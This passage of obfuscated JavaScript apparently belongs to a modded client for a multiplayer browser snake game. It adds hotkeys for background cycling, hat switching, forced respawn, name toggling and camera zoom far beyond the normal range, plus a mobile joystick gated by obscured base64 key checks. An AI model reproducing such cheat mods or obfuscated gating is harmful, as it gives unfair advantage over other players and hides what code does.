          for (var _0x36a1bc = 0; _0x36a1bc < this.Hn.Zc.qd.length; _0x36a1bc++) {
            this.Hn.Zc.qd[_0x36a1bc].Rj(this.Pn);
          }
        }
      };
      _0x53956b.prototype.Im = function () {
        return this.$c;
      };
      _0x53956b.prototype.Gm = function (_0x3d4568) {
        this.In = _0x3d4568;
        this.Jn = "#ffffff";
        this.Tm();
      };
      _0x53956b.prototype.Hm = function (_0x5193e0) {
        this.In = _0x3090f3;
        this.Jn = _0x5193e0;
        this.Tm();
      };
      _0x53956b.prototype.Tm = function () {
        this.Hn.hd(_0x7f096e.jd.ch, null, ooo.ud.Cc().Tb(this.In.Tj), ooo.ud.Cc().Vb(this.In.Uj), ooo.ud.Cc().Wb(this.In.Vj), ooo.ud.Cc().Xb(this.In.Xj), ooo.ud.Cc().Yb(this.In.Wj), this.Jn);
      };
      _0x53956b.prototype.Dm = function (_0xecd0f4) {
        this.mj = _0xecd0f4;
      };
      _0x53956b.prototype.Km = function () {
        return this.mj;
      };
      _0x53956b.prototype.Wm = function (_0x139b9c, _0x2571ed) {
        this.Kn = _0x139b9c;
        this.Ln = _0x2571ed;
        for (var _0x31d1d0 = 0; _0x31d1d0 < this.$c; _0x31d1d0++) {
          var _0x4562e4 = this.Hn._c[_0x31d1d0];
          _0x4562e4.ld.Rj(this.Kn);
          _0x4562e4.md.Rj(this.Ln);
        }
      };
      _0x53956b.prototype.Zm = function (_0x5d34be, _0x253c1c, _0x5b2e8a, _0x282aaf) {
        this.Mn = _0x5d34be;
        this.Nn = _0x253c1c;
        this.On = _0x5b2e8a;
        this.Pn = _0x282aaf;
        for (var _0x38bdfa = 0; _0x38bdfa < this.Hn.Zc.od.length; _0x38bdfa++) {
          this.Hn.Zc.od[_0x38bdfa].Rj(this.Mn);
        }
        ;
        for (var _0x426e9b = 0; _0x426e9b < this.Hn.Zc.pd.length; _0x426e9b++) {
          this.Hn.Zc.pd[_0x426e9b].Rj(this.Nn);
        }
        ;
        for (var _0x55d852 = 0; _0x55d852 < this.Hn.Zc.rd.length; _0x55d852++) {
          this.Hn.Zc.rd[_0x55d852].Rj(this.On);
        }
        ;
        for (var _0x37cef6 = 0; _0x37cef6 < this.Hn.Zc.qd.length; _0x37cef6++) {
          this.Hn.Zc.qd[_0x37cef6].Rj(this.Pn);
        }
      };
      _0x53956b.prototype.Bg = function () {
        var _0x444c1f = this.mj * 2;
        var _0x35becc = this.mj * 2 * 1.5;
        if (this.$c > 0) {
          var _0x4e3c89 = this.Jm[0];
          var _0x57d37e = this.Jm[1];
          var _0x16ffa8 = this.Jm[2];
          this.Hn._c[0].Ad(_0x4e3c89, _0x57d37e, _0x444c1f, _0x35becc, _0x16ffa8);
          this.Hn.Zc.Ad(_0x4e3c89, _0x57d37e, _0x444c1f, _0x16ffa8);
        }
        ;
        for (var _0x440add = 1; _0x440add < this.$c; _0x440add++) {
          var _0x1b90cb = this.Jm[_0x440add * 3];
          var _0x54d252 = this.Jm[_0x440add * 3 + 1];
          var _0x4b1f4e = this.Jm[_0x440add * 3 + 2];
          this.Hn._c[_0x440add].Ad(_0x1b90cb, _0x54d252, _0x444c1f, _0x35becc, _0x4b1f4e);
        }
      };
      _0x53956b.prototype._m = function (_0x3ae357) {
        _0x3ae357.render(this.Hn.Yc);
      };
      return _0x53956b;
    }();
    _0x7f096e.Uf = function () {
      function _0x56b86a(_0x326019) {
        this.Wd = _0x326019;
      }
      _0x56b86a.Tf = $("#background-canvas");
      _0x56b86a.Qn = $("#stretch-box");
      _0x56b86a.Rn = $("#social-buttons");
      _0x56b86a.Sn = $("#markup-wrap");
      _0x56b86a.Tn = $("#game-view");
      _0x56b86a.Un = $("#results-view");
      _0x56b86a.Vn = $("#main-menu-view");
      _0x56b86a.Wn = $("#popup-view");
      _0x56b86a.Xn = $("#toaster-view");
      _0x56b86a.Yn = $("#loading-view");
      _0x56b86a.Zn = $("#restricted-view");
      _0x56b86a.$n = $("#error-gateway-connection-view");
      _0x56b86a._n = $("#error-game-connection-view");
      _0x56b86a.prototype.Sa = function () {};
      _0x56b86a.prototype.ml = function () {};
      _0x56b86a.prototype.nl = function () {};
      _0x56b86a.prototype.hl = function () {};
      _0x56b86a.prototype.qg = function () {};
      _0x56b86a.prototype.ug = function (_0x4016e3, _0x2da25c) {};
      return _0x56b86a;
    }();
    _0x226af9 = $("#final-caption");
    _0x243d00 = $("#final-continue");
    _0x19b2c7 = $("#congrats-bg");
    _0x27fb3f = $("#unl6wj4czdl84o9b");
    _0x2e5d67 = $("#final-share-fb");
    _0x3c4a57 = $("#final-message");
    _0xba08 = $("#final-score");
    _0x1250ad = $("#final-place");
    _0x3fb489 = $("#final-board");
    _0x2b23a9 = $("#game-canvas");
    (_0x3eadc8 = _0x331039.ca(_0x7f096e.Uf, function () {
      _0x7f096e.Uf.call(this, _0x7f096e.ll.ao);
      var _0x87f727 = this;
      var _0x119ef5 = _0x2b23a9.get()[0];
      _0x2e5d67.toggle(_0x494ea6.co.bo);
      _0x226af9.text(_0x331039.U("index.game.result.title"));
      _0x243d00.text(_0x331039.U("index.game.result.continue"));
      _0x243d00.html("Continue (Home)");
      _0x243d00.after("<div id='final-replay'>Replay</div>");
      _0x243d00.click(function () {
        ooo.ij.if();
        _0x494ea6.co.do.Va();
        ooo.ij.Ye(_0x7f096e.Pe.Se.Jf);
        ooo.Xg.gl(ooo.Xg.Jf);
      });
      $("#final-replay").click(function () {
        ooo.ij.if();
        ooo.to();
      });
      const _0x231ba1 = document.getElementById("popup-view");
      let _0x2d48b7 = null;
      if (_0x231ba1) {
        const _0x596f88 = new MutationObserver(function (_0x59de43) {
          _0x59de43.forEach(function (_0x324911) {
            if (_0x324911.type === "attributes" && _0x324911.attributeName === "style") {
              const _0x902962 = _0x231ba1.style.display;
              if (_0x902962 === "block") {
                if (_0x2d48b7) {
                  document.removeEventListener("click", _0x2d48b7);
                }
                _0x2d48b7 = function (_0x121948) {
                  const _0x150cd6 = _0x121948.target;
                  if (_0x150cd6.tagName === "BUTTON" || _0x150cd6.tagName === "A" || _0x150cd6.tagName === "INPUT" || _0x150cd6.tagName === "SELECT" || _0x150cd6.tagName === "TEXTAREA" || _0x150cd6.closest("button") || _0x150cd6.closest("a") || _0x150cd6.closest("input")) {
                    return;
                  }
                  setTimeout(() => {
                    if (_0x231ba1.style.display === "block") {
                      const _0x3b74ca = document.querySelector(".popup-view-list");
                      if (_0x3b74ca && !_0x3b74ca.contains(_0x121948.target)) {
                        const _0x10a549 = document.getElementById("popup-menu-back");
                        if (_0x10a549) {
                          _0x10a549.click();
                        }
                      }
                    }
                  }, 50);
                };
                setTimeout(() => {
                  document.addEventListener("click", _0x2d48b7);
                }, 50);
              }
            }
          });
        });
        _0x596f88.observe(_0x231ba1, {
          attributes: true,
          attributeFilter: ["style"]
        });
      }
      var _0x3aea33 = [{
        url: atob(_0x56e2a2[24])
      }, {
        url: atob(_0x56e2a2[28])
      }, {
        url: atob(_0x56e2a2[29])
      }, {
        url: atob(_0x56e2a2[37])
      }, {
        url: atob(_0x56e2a2[32])
      }, {
        url: atob(_0x56e2a2[31])
      }, {
        url: atob(_0x56e2a2[26])
      }, {
        url: atob(_0x56e2a2[25])
      }, {
        url: atob(_0x56e2a2[30])
      }, {
        url: atob(_0x56e2a2[27])
      }, {
        url: atob(_0x56e2a2[38])
      }, {
        url: atob(_0x56e2a2[39])
      }];
      var _0x487313 = 0;
      function _0x1e2a6a() {
        if (!_0x5c2dcc.on) {
          return;
        }
        _0x487313 = (_0x487313 + 1) % _0x3aea33.length;
        var _0x50ff16 = _0x3aea33[_0x487313].url;
        _0x207b06.background = _0x50ff16;
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        try {
          if (PIXI.utils.TextureCache[_0x50ff16]) {
            PIXI.utils.TextureCache[_0x50ff16].destroy(true);
            delete PIXI.utils.TextureCache[_0x50ff16];
          }
          if (typeof ooo !== "undefined" && ooo.ef && ooo.ef.fn_o) {
            var _0x3179e8 = ooo.ef.fn_o(_0x50ff16);
            ooo.ef.F_bg = new PIXI.Texture(_0x3179e8);
          } else if (typeof PIXI !== "undefined") {
            ooo.ef.F_bg = PIXI.Texture.from(_0x50ff16);
          }
          if (ooo && ooo.Xg && ooo.Xg.Kf && ooo.Xg.Kf.Wg && ooo.Xg.Kf.Wg.sh) {
            ooo.Xg.Kf.Wg.sh.Hh(ooo.ef.F_bg);
          }
        } catch (_0xbcaa05) {}
      }
      let _0x2f49be = {
        left: false,
        right: false
      };
      function _0x412c7d() {
        if (_0x207b06.hz && !_0x207b06.mobile) {
          if (_0x2f49be.left && _0x207b06.z >= 0.2) {
            _0x207b06.z = _0x207b06.z - 0.05;
          }
          if (_0x2f49be.right && _0x207b06.z <= 25) {
            _0x207b06.z = _0x207b06.z + 0.05;
          }
        }
        requestAnimationFrame(_0x412c7d);
      }
      $("html").keydown(function (_0x127bbe) {
        if (document.activeElement.id === "mm-params-nickname") {
          return;
        }
        if (_0x127bbe.keyCode !== 17 || !(_0x207b06.ctrl = true)) {
          if (_0x127bbe.keyCode !== 17) {
            _0x207b06.ctrl = false;
          }
        }
        if (_0x127bbe.keyCode === 53) {
          if (_0x207b06.s || _0x5c2dcc.on) {
            _0x1e2a6a();
          }
        }
        if (_0x127bbe.keyCode == 188 || _0x127bbe.keyCode == 37) {
          _0x2f49be.left = true;
        }
        if (_0x127bbe.keyCode == 190 || _0x127bbe.keyCode == 39) {
          _0x2f49be.right = true;
        }
        if (_0x127bbe.keyCode === 32) {
          _0x87f727.eo = true;
        }
        if (_0x127bbe.keyCode === 49) {
          _0x2eff80();
        }
        if (_0x127bbe.keyCode === 50) {
          if (_0x5c2dcc.on && _0x207b06.s) {
            if (_0x207b06.selectedHats && _0x207b06.selectedHats.length > 0) {
              _0x207b06.currentHatIndex = (_0x207b06.currentHatIndex + 1) % _0x207b06.selectedHats.length;
              let _0x236da5 = _0x207b06.selectedHats[_0x207b06.currentHatIndex];
              _0x3896bc(_0x236da5);
              localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
            }
          }
        }
      }).keyup(function (_0x532c1a) {
        if (document.activeElement.id === "mm-params-nickname") {
          return;
        }
        _0x207b06.ctrl = false;
        if (_0x532c1a.keyCode == 188 || _0x532c1a.keyCode == 37) {
          _0x2f49be.left = false;
        }
        if (_0x532c1a.keyCode == 190 || _0x532c1a.keyCode == 39) {
          _0x2f49be.right = false;
        }
        if (_0x5c2dcc.on && _0x207b06.s) {
          if (_0x532c1a.keyCode == 81 || _0x532c1a.keyCode == 87) {
            if (_0x532c1a.keyCode == 81) {
              _0xfa7e1.texture = _0x1a4670;
              _0x2e32b4.texture = _0x4de304;
              _0xfa7e1.alpha = 1;
              _0x2e32b4.alpha = 0.25;
              _0xe80c4e();
            }
            if (_0x532c1a.keyCode == 87) {
              _0x2e32b4.texture = _0x80766b;
              _0xfa7e1.texture = _0x548fe1;
              _0xfa7e1.alpha = 0.25;
              _0x2e32b4.alpha = 1;
              _0x39f098();
            }
          } else {
            _0x2e32b4.texture = _0x4de304;
            _0xfa7e1.texture = _0x548fe1;
            _0x2e32b4.alpha = 0.25;
            _0xfa7e1.alpha = 0.25;
            _0x33e15a = false;
            _0x38aca6 = 55;
            _0xb42c97 = 1;
            _0x13b8e7 = true;
            clearInterval(_0x18dfde);
            _0x18dfde = null;
          }
          if (_0x532c1a.keyCode == 90) {
            if (_0x207b06.z == 1) {
              if (_0x207b06.h) {
                _0x207b06.z = 1.6;
              } else {
                _0x207b06.z = 1.2;
              }
              _0x314f33.texture = _0x6c8187;
              _0x314f33.alpha = 1;
            } else {
              _0x207b06.z = 1;
              _0x314f33.texture = _0x4e187f;
              _0x314f33.alpha = 0.25;
            }
            localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          }
        }
        if (_0x5c2dcc.on && _0x532c1a.keyCode == 82) {
          if (!window.lastRespawnTime) {
            window.lastRespawnTime = 0;
          }
          const _0x33709e = new Date().getTime();
          const _0xf29164 = _0x33709e - window.lastRespawnTime;
          if (_0xf29164 < 1000) {
            return;
          }
          window.lastRespawnTime = _0x33709e;
          if (_0x207b06.pi && _0x207b06.pn) {
            $("#port_id_s").val(_0x207b06.pi);
            $("#port_name_s").val(_0x207b06.pn);
            $("#port_id").val($("#port_id_s").val());
            $("#port_name").val($("#port_name_s").val());
          }
          _0x207b06.r1 = true;
          try {
            if (ooo.Mh && typeof ooo.Mh.uj === "function") {
              ooo.Mh.uj();
              setTimeout(function () {
                document.getElementById("mm-action-play").click();
              }, 300);
              return;
            }
          } catch (_0xa8f0d6) {}
          try {
            if (ooo.Mh && typeof ooo.Mh.gr === "function") {
              ooo.Mh.gr();
            } else if (ooo.Mh && ooo.Mh.Rq) {
              try {
                ooo.Mh.go = 3;
              } catch (_0x455b37) {}
              ooo.Mh.Rq.close();
            }
            setTimeout(function () {
              try {
                const _0x45cfe1 = document.querySelectorAll(".error, .alert, .modal, .popup, .notification");
                _0x45cfe1.forEach(_0x36d834 => {
                  try {
                    _0x36d834.style.display = "none";
                  } catch (_0x20418e) {}
                });
              } catch (_0x21328a) {}
              document.getElementById("mm-action-play").click();
            }, 350);
          } catch (_0x473706) {
            document.getElementById("mm-action-play").click();
          }
        }
        if (_0x5c2dcc.on && _0x532c1a.keyCode == 56) {
          document.getElementById("settings-show-names-switch").click();
          if (_0x207b06.sn) {
            _0x207b06.sn = false;
          } else {
            _0x207b06.sn = true;
          }
        }
        if (_0x5c2dcc.on && _0x532c1a.keyCode == 66) {
          _0x207b06.bannedWordsEnabled = !_0x207b06.bannedWordsEnabled;
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          setTimeout(_0xe8d0c, 100);
        }
        if (_0x532c1a.keyCode === 32) {
          _0x87f727.eo = false;
        }
      });
      _0x412c7d();
      window.addEventListener("load", function () {
        if (_0x207b06.background) {
          var _0x49ac8b = _0x207b06.background;
          for (var _0x53b405 = 0; _0x53b405 < _0x3aea33.length; _0x53b405++) {
            if (_0x3aea33[_0x53b405].url === _0x49ac8b) {
              _0x487313 = _0x53b405;
              break;
            }
          }
        }
      });
      _0x119ef5.addEventListener("touchmove", function (_0x52b078) {
        if (_0x5c2dcc.on && _0x207b06.mobile && _0x207b06.mo != 6 && _0x207b06.s) {
          var _0x4f532c = btoa(_0x207b06.c_1);
          if (_0x207b06.mo1.x != -1 && _0x207b06.mo1.y == -1 && btoa(_0x4f532c) == _0x207b06.d_1 || _0x207b06.mo2.x == -1 && _0x207b06.mo2.y != -1 && btoa(_0x4f532c) == _0x207b06.d_1) {
            var _0xcad896 = ooo.Xg.Kf.Wg.Ah;
            var _0x186203 = _0x119ef5.offsetHeight;
            var _0x637173 = _0x119ef5.offsetWidth;
            var _0xc56865 = _0x186203 * 0.5;
            var _0x1664b3 = _0x637173 * 0.5;
            var _0x36976c = btoa(_0x207b06.c_2);
            for (let _0x265c41 = 0; _0x265c41 < _0x52b078.changedTouches.length; _0x265c41++) {
              var _0x1ee767 = _0x52b078.changedTouches[_0x265c41].pageX;
              var _0x5a22fa = _0x52b078.changedTouches[_0x265c41].pageY;
              var _0x4c6075 = _0x52b078.changedTouches[_0x265c41].identifier;
              if (_0x207b06.mo == 1 && btoa(_0x36976c) == _0x207b06.d_2) {
                _0x186203 *= 0.5;
                _0x637173 *= 0.5;
              }
              if (_0x207b06.mo == 2 && btoa(_0x36976c) == _0x207b06.d_2) {
                _0x186203 = _0xcad896.img_o_2.y + 110;
                _0x637173 = _0xcad896.img_o_2.x + 110;
              }
              if (_0x207b06.mo == 3 && btoa(_0x36976c) == _0x207b06.d_2) {
                _0x186203 = _0xcad896.img_o_3.y + 110;
                _0x637173 = _0xcad896.img_o_3.x + 110;
              }
              if (_0x207b06.mo == 4 && btoa(_0x36976c) == _0x207b06.d_2 || _0x207b06.mo == 5 && btoa(_0x36976c) == _0x207b06.d_2) {
                _0x186203 = _0xcad896.img_o_4.y + 110;
                _0x637173 = _0xcad896.img_o_4.x + 110;
              }
              var _0x12105f = btoa(_0x207b06.c_5);
              var _0x10bb9b = Math.atan2(_0x5a22fa - _0x186203, _0x1ee767 - _0x637173);
              var _0x1ce0b8 = Math.cos(_0x10bb9b);
              var _0xba3aec = Math.sin(_0x10bb9b);
              var _0x5d1031 = btoa(_0x207b06.c_4);
              var _0x5e9005 = _0x207b06.mo1.x == _0x4c6075;
              btoa(_0x207b06.c_3);
              if (_0x5e9005 && btoa(_0x5d1031) == _0x207b06.d_4) {
                if (_0x1ee767 <= 0 || _0x5a22fa <= 0) {
                  _0x207b06.mo1.x = -1;
                  if (_0x207b06.mo == 1) {
                    _0xcad896.img_p_1.alpha = 0.25;
                  }
                  if (_0x207b06.mo == 2) {
                    _0xcad896.img_o_2.alpha = 0.25;
                    _0xcad896.img_i_2.alpha = 0.25;
                    _0xcad896.img_p_2.alpha = 0.25;
                  }
                  if (_0x207b06.mo == 3) {
                    _0xcad896.img_o_3.alpha = 0.25;
                    _0xcad896.img_i_3.alpha = 0.25;
                    _0xcad896.img_p_3.alpha = 0.25;
                  }
                  if (_0x207b06.mo == 4 || _0x207b06.mo == 5) {
                    _0xcad896.img_p_2.alpha = 0.25;
                  }
                } else {
                  _0x87f727.fo = _0x10bb9b;
                  var _0x489729 = 50;
                  if (_0x207b06.mo == 1 || _0x207b06.mo == 4 || _0x207b06.mo == 5) {
                    _0x489729 = 110;
                  }
                  var _0x5e40cb = _0x637173 - _0x1ee767;
                  var _0x30fd97 = _0x186203 - _0x5a22fa;
                  var _0x4b5d3b = Math.sqrt(_0x5e40cb * _0x5e40cb + _0x30fd97 * _0x30fd97);
                  var _0x500914 = _0x1664b3 + _0x4b5d3b * _0x1ce0b8 - 68;
                  var _0x1b075d = _0xc56865 + _0x4b5d3b * _0xba3aec - 68;
                  var _0x388dc6 = _0x1664b3 + _0x489729 * _0x1ce0b8 - 68;
                  var _0x5ed969 = _0xc56865 + _0x489729 * _0xba3aec - 68;
                  var _0x3891bf = _0x1664b3 + _0x1ce0b8 * 75 - 68;
                  var _0x482385 = _0xc56865 + _0xba3aec * 75 - 68;
                  var _0x36ebad = _0x1ee767 - 85;
                  var _0x36408c = _0x5a22fa - 85;
                  var _0x2b80c6 = _0x637173 + _0x489729 * _0x1ce0b8 - 85;
                  var _0x59271f = _0x186203 + _0x489729 * _0xba3aec - 85;
                  var _0x27a4fc = _0x637173 + _0x1ce0b8 * 3 - 110;
                  var _0x18ac5b = _0x186203 + _0xba3aec * 3 - 110;
                  if (_0x4b5d3b < _0x489729) {
                    if (_0x207b06.mo2.x == -1 && _0x207b06.mo2.y != -1) {
                      _0xcad896.img_pf_1.x = _0x500914;
                      _0xcad896.img_pf_1.y = _0x1b075d;
                    } else {
                      if (_0x207b06.mo == 1) {
                        _0xcad896.img_p_1.x = _0x500914;
                        _0xcad896.img_p_1.y = _0x1b075d;
                      }
                      if (_0x207b06.mo == 2 || _0x207b06.mo == 4 || _0x207b06.mo == 5) {
                        _0xcad896.img_p_2.x = _0x500914;
                        _0xcad896.img_p_2.y = _0x1b075d;
                      }
                      if (_0x207b06.mo == 3) {
                        _0xcad896.img_p_3.x = _0x500914;
                        _0xcad896.img_p_3.y = _0x1b075d;
                      }
                    }
                    if (_0x207b06.mo == 2) {
                      _0xcad896.img_i_2.y = _0x36408c;
                      _0xcad896.img_i_2.x = _0x36ebad;
                    }
                    if (_0x207b06.mo == 3) {
                      _0xcad896.img_i_3.y = _0x36408c;
                      _0xcad896.img_i_3.x = _0x36ebad;
                    }
                  } else {
                    if (_0x207b06.mo2.x == -1 && _0x207b06.mo2.y != -1) {
                      _0xcad896.img_pf_1.x = _0x388dc6;
                      _0xcad896.img_pf_1.y = _0x5ed969;
                      if (_0x207b06.mo == 2 || _0x207b06.mo == 3) {
                        if (_0x4b5d3b < 75) {
                          _0xcad896.img_pf_1.x = _0x500914;
                          _0xcad896.img_pf_1.y = _0x1b075d;
                        } else {
                          _0xcad896.img_pf_1.x = _0x3891bf;
                          _0xcad896.img_pf_1.y = _0x482385;
                        }
                      }
                    } else {
                      if (_0x207b06.mo == 1) {
                        _0xcad896.img_p_1.x = _0x388dc6;
                        _0xcad896.img_p_1.y = _0x5ed969;
                      }
                      if (_0x207b06.mo == 2 || _0x207b06.mo == 4 || _0x207b06.mo == 5) {
                        _0xcad896.img_p_2.x = _0x388dc6;
                        _0xcad896.img_p_2.y = _0x5ed969;
                        if (_0x207b06.mo == 2) {
                          if (_0x4b5d3b < 75) {
                            _0xcad896.img_p_2.x = _0x500914;
                            _0xcad896.img_p_2.y = _0x1b075d;
                          } else {
                            _0xcad896.img_p_2.x = _0x3891bf;
                            _0xcad896.img_p_2.y = _0x482385;
                          }
                        }
                      }
                      if (_0x207b06.mo == 3) {
                        if (_0x4b5d3b < 75) {
                          _0xcad896.img_p_3.x = _0x500914;
                          _0xcad896.img_p_3.y = _0x1b075d;
                        } else {
                          _0xcad896.img_p_3.x = _0x3891bf;
                          _0xcad896.img_p_3.y = _0x482385;
                        }
                      }
                    }
                    if (_0x207b06.mo == 2) {
                      _0xcad896.img_i_2.y = _0x59271f;
                      _0xcad896.img_i_2.x = _0x2b80c6;
                    }
                    if (_0x207b06.mo == 3) {
                      _0xcad896.img_i_3.y = _0x59271f;
                      _0xcad896.img_i_3.x = _0x2b80c6;
                      _0xcad896.img_o_3.y = _0x18ac5b;
                      _0xcad896.img_o_3.x = _0x27a4fc;
                    }
                  }
                }
              } else if ((_0x5e9005 = _0x207b06.mo2.y == _0x4c6075) && btoa(_0x12105f) == _0x207b06.d_5) {
                if (_0x1ee767 <= 0 || _0x5a22fa <= 0) {
                  _0x207b06.mo2.y = -1;
                  _0xcad896.img_f.visible = false;
                  _0xcad896.img_pf_1.visible = false;
                  if (_0x207b06.mo == 1) {
                    _0xcad896.img_p_1.visible = true;
                  }
                  if (_0x207b06.mo == 2 || _0x207b06.mo == 4 || _0x207b06.mo == 5) {
                    _0xcad896.img_p_2.visible = true;
                  }
                  if (_0x207b06.mo == 3) {
                    _0xcad896.img_p_3.visible = true;
                  }
                  if (_0x207b06.mo == 4 || _0x207b06.mo == 5) {
                    _0xcad896.img_f.visible = true;
                  }
                  _0x87f727.eo = false;
                } else if (_0x207b06.mo == 3) {
                  _0x1ce0b8 = Math.cos(_0x10bb9b = Math.atan2(_0x5a22fa - (_0x186203 = _0xcad896.img_f.y + 100), _0x1ee767 - (_0x637173 = _0xcad896.img_f.x + 100)));
                  _0xba3aec = Math.sin(_0x10bb9b);
                  var _0x36ebad = _0x637173 + _0x1ce0b8 * 3 - 100;
                  var _0x36408c = _0x186203 + _0xba3aec * 3 - 100;
                  var _0x5e40cb = _0x637173 - _0x1ee767;
                  var _0x30fd97 = _0x186203 - _0x5a22fa;
                  var _0x4b5d3b = Math.sqrt(_0x5e40cb * _0x5e40cb + _0x30fd97 * _0x30fd97);
                  if (_0x4b5d3b >= 40) {
                    _0xcad896.img_f.y = _0x36ebad;
                    _0xcad896.img_f.x = _0x36408c;
                  }
                }
              }
            }
          }
        } else if (!_0x2964bf() || !_0x207b06.joystick.checked) {
          if (_0x52b078 = _0x52b078 || window.event) {
            if ((_0x52b078 = _0x52b078.touches[0]).clientX !== undefined) {
              _0x87f727.fo = Math.atan2(_0x52b078.clientY - _0x119ef5.offsetHeight * 0.5, _0x52b078.clientX - _0x119ef5.offsetWidth * 0.5);
            } else {
              _0x87f727.fo = Math.atan2(_0x52b078.pageY - _0x119ef5.offsetHeight * 0.5, _0x52b078.pageX - _0x119ef5.offsetWidth * 0.5);
            }
          }
        }
      }, true);
      _0x119ef5.addEventListener("touchstart", function (_0x59f31b) {
        if (_0x5c2dcc.on && _0x207b06.mobile && _0x207b06.mo != 6 && _0x207b06.s) {
          var _0x359a28 = ooo.Xg.Kf.Wg.Ah;
          var _0x28d55a = btoa(_0x207b06.c_4);
          var _0x2668ec = _0x119ef5.offsetHeight;
          var _0x2ec3e7 = btoa(_0x207b06.c_3);
          var _0x31471f = _0x119ef5.offsetWidth;
          var _0x2d2eff = btoa(_0x207b06.c_5);
          var _0x141da2 = (_0x59f31b = _0x59f31b || window.event).touches.item(0).pageX;
          var _0x571d21 = btoa(_0x207b06.c_2);
          var _0x3def82 = _0x59f31b.touches.item(0).pageY;
          var _0x58da0e = _0x59f31b.touches.length;
          var _0x1f5cd4 = btoa(_0x207b06.c_1);
          var _0x86b4f2 = _0x59f31b.touches.item(0).identifier;
          for (let _0x2a0e75 = 0; _0x2a0e75 < _0x58da0e; _0x2a0e75++) {
            if (_0x207b06.mo2.x == -1 && _0x207b06.mo2.y != -1) {
              if (_0x59f31b.touches.item(_0x2a0e75).identifier != _0x207b06.mo2.y) {
                _0x141da2 = _0x59f31b.touches.item(_0x2a0e75).pageX;
                _0x3def82 = _0x59f31b.touches.item(_0x2a0e75).pageY;
                _0x86b4f2 = _0x59f31b.touches.item(_0x2a0e75).identifier;
              }
            } else {
              _0x141da2 = _0x59f31b.touches.item(_0x2a0e75).pageX;
              _0x3def82 = _0x59f31b.touches.item(_0x2a0e75).pageY;
              _0x86b4f2 = _0x59f31b.touches.item(_0x2a0e75).identifier;
            }
          }
          ;
          var _0x1fa6fa = 0;
          if (_0x207b06.mo == 4 && btoa(_0x2d2eff) == _0x207b06.d_5 || _0x207b06.mo == 5 && btoa(_0x28d55a) == _0x207b06.d_4) {
            _0x1fa6fa = Math.sqrt((_0x141da2 - _0x359a28.img_f.x - 100) * (_0x141da2 - _0x359a28.img_f.x - 100) + (_0x3def82 - _0x359a28.img_f.y - 100) * (_0x3def82 - _0x359a28.img_f.y - 100));
          }
          if (_0x58da0e == 1 && (_0x207b06.mo == 4 && _0x1fa6fa > 40 || _0x207b06.mo != 4) && (_0x207b06.mo == 5 && _0x1fa6fa > 40 || _0x207b06.mo != 5)) {
            _0x207b06.mo2.y = -1;
            _0x359a28.img_f.visible = false;
            _0x359a28.img_pf_1.visible = false;
            if (_0x207b06.mo == 1) {
              _0x359a28.img_p_1.alpha = 0.25;
              _0x359a28.img_p_1.visible = true;
            }
            if (_0x207b06.mo == 2) {
              _0x359a28.img_o_2.alpha = 0.25;
              _0x359a28.img_i_2.alpha = 0.25;
              _0x359a28.img_p_2.alpha = 0.25;
              _0x359a28.img_p_2.visible = true;
            }
            if (_0x207b06.mo == 3) {
              _0x359a28.img_o_3.alpha = 0.25;
              _0x359a28.img_i_3.alpha = 0.25;
              _0x359a28.img_p_3.alpha = 0.25;
              _0x359a28.img_p_3.visible = true;
            }
            if (_0x207b06.mo == 4 || _0x207b06.mo == 5) {
              _0x359a28.img_p_2.alpha = 0.25;
              _0x359a28.img_p_2.visible = true;
              _0x359a28.img_f.visible = true;
            }
            _0x87f727.eo = false;
          }
          if (_0x207b06.mo1.x == -1 && _0x207b06.mo1.y == -1 && btoa(_0x28d55a) == _0x207b06.d_4 && (_0x207b06.mo == 4 && _0x1fa6fa > 40 || _0x207b06.mo != 4 && btoa(_0x2ec3e7) == _0x207b06.d_3) && (_0x207b06.mo == 5 && _0x1fa6fa > 40 || _0x207b06.mo != 5 && btoa(_0x571d21) == _0x207b06.d_2)) {
            _0x207b06.mo1.x = _0x86b4f2;
            if (_0x207b06.mo1.x == _0x207b06.mo2.y && _0x207b06.mo1.y == _0x207b06.mo2.x) {
              _0x141da2 = _0x59f31b.touches.item(1).pageX;
              _0x3def82 = _0x59f31b.touches.item(1).pageY;
            }
            var _0x122ef3 = _0x31471f * 0.5 - 68;
            var _0xbc1d41 = _0x2668ec * 0.5 - 68;
            var _0x57a08e = _0x141da2 - 110;
            var _0x1352c9 = _0x3def82 - 110;
            var _0x3be252 = _0x141da2 - 85;
            var _0x505f39 = _0x3def82 - 85;
            if (_0x207b06.mo == 1 && _0x207b06.mo2.x == -1 && _0x207b06.mo2.y == -1) {
              _0x359a28.img_p_1.alpha = 1;
              _0x359a28.img_p_1.x = _0x122ef3;
              _0x359a28.img_p_1.y = _0xbc1d41;
              _0x359a28.img_p_1.visible = true;
            }
            if (_0x207b06.mo == 2) {
              _0x359a28.img_o_2.alpha = 1;
              _0x359a28.img_o_2.x = _0x57a08e;
              _0x359a28.img_o_2.y = _0x1352c9;
              _0x359a28.img_i_2.alpha = 1;
              _0x359a28.img_i_2.x = _0x3be252;
              _0x359a28.img_i_2.y = _0x505f39;
              if (_0x207b06.mo2.x == -1 && _0x207b06.mo2.y == -1) {
                _0x359a28.img_p_2.alpha = 1;
                _0x359a28.img_p_2.x = _0x122ef3;
                _0x359a28.img_p_2.y = _0xbc1d41;
                _0x359a28.img_p_2.visible = true;
              }
            }
            if (_0x207b06.mo == 3 && btoa(_0x2d2eff) == _0x207b06.d_5) {
              _0x359a28.img_o_3.alpha = 1;
              _0x359a28.img_o_3.x = _0x57a08e;
              _0x359a28.img_o_3.y = _0x1352c9;
              _0x359a28.img_i_3.alpha = 1;
              _0x359a28.img_i_3.x = _0x3be252;
              _0x359a28.img_i_3.y = _0x505f39;
              if (_0x207b06.mo2.x == -1 && _0x207b06.mo2.y == -1) {
                _0x359a28.img_p_3.alpha = 1;
                _0x359a28.img_p_3.x = _0x122ef3;
                _0x359a28.img_p_3.y = _0xbc1d41;
                _0x359a28.img_p_3.visible = true;
              }
            }
            if (_0x207b06.mo == 4 && btoa(_0x571d21) == _0x207b06.d_2 && _0x207b06.mo2.x == -1 && _0x207b06.mo2.y == -1) {
              _0x359a28.img_p_2.alpha = 1;
              _0x359a28.img_p_2.x = _0x122ef3;
              _0x359a28.img_p_2.y = _0xbc1d41;
              _0x359a28.img_p_2.visible = true;
            }
